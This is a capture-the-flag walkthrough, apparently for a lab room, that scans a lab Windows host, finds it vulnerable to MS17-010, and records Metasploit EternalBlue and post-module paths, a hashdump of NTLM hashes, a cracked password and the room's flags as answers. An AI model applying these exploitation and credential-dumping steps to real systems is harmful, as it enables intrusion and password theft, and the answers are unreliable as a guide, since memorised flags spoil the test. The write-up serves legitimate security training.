export IP=10.10.230.248


NMAP port scan under 1000
```
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack
```

Q1	How many ports are open with a port number under 1000?
```
3

```

NMAP vulnerability scan
```
PORT    STATE SERVICE      REASON
445/tcp open  microsoft-ds syn-ack

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

```

Q2	What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
```
ms17-010

```

Q3	Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
```
exploit/windows/smb/ms17_010_eternalblue

```

Q4	Show options and set the one required value. What is the name of this value? (All caps for submission)
```
RHOSTS

```


Q5	If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
```
post/multi/manage/shell_to_meterpreter

```

Q6	Select this (use MODULE_PATH). Show options, what option are we required to change?
```
session

```

hashdump
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

```

Q7	Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
```
Jon

```

Q8	Copy this password hash to a file and research how to crack it. What is the cracked password?
```
alqfna22

```

Flag1? This flag can be found at the system root. 
```
flag{access_the_machine}

```

Flag2? This flag can be found at the location where passwords are stored within Windows.
```
flag{sam_database_elevated_access}

```

flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
```
flag{admin_documents_can_be_valuable}

```

















